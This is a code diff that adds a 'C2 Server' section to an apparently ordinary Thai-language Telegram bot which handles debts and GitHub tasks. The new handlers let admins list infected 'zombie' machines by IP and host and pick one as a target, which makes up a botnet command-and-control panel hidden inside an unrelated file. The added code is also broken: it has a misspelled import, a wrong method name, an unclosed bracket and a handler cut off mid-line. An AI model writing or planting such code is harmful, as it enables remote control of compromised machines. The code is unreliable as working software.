@@ -1,4 +1,9 @@
 import io
+import json
+import socket
+import struct
+import traceback
+from typing import Dict, List, Callab, Optional
 import os
 import re
 import sys
@@ -15,6 +20,7 @@ load_dotenv()
 from telegram import Update, ChatPermissions, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.constants import ChatMemberStatus, ChatAction, ChatType
 from telegram.ext import (
+    Application,
     ApplicationBuilder,
     CommandHandler,
     MessageHandler,
@@ -3460,6 +3466,40 @@ async def debt_callback_handler(update: Update, context: ContextTypes.DEFAULT_TY
             await query.answer("เกิดข้อผิดพลาด ลองใหม่อีกครั้ง", show_alert=True)
         except TelegramError:
             pass
+            
+            
+# ------ C2 Server ---------
+
+def is_admins(update: Update) -> bool:
+    return update.effective_user.id in ADMIN_IDS
+    
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not is_admins(update):
+        await update.message.reply_text("Access Denied. Admins Only.")
+        return
+    await update.message_reply_text("C2 Bot Initialized. Listening for zombies...")
+    
+async def list_zombies(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not is_admins(update):
+        await update.message.reply_text("Access Denied.")
+        return
+        
+    if not ACTIVE_BOTS:
+        await update.message.reply_text("No active zombies connected.")
+        return
+        
+    msg = "**Active Zombies:**\n"
+    buttons = []
+    for sid, info in ACTIVE_BOTS.items():
+        msg += f"ID: `{sid[:20]}...` | IP: {info['ip']} | Host: {info.get('host', 'Unknown')}\n"
+        buttons.append([InlineKeyboardButton(f"Target: {sid[:15]}", callback_data=f"sel_{sid}")
+    
+    keyboard = InlineKeyboardMarkup(buttons)
+    await update.message.reply_text(msg, parse_mode="Markdown", reply_markup=keyboard)
+    
+async def select_target_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query
+
         
 # ---------------- GitHub Repository Manager (Phase 7) ----------------
 #
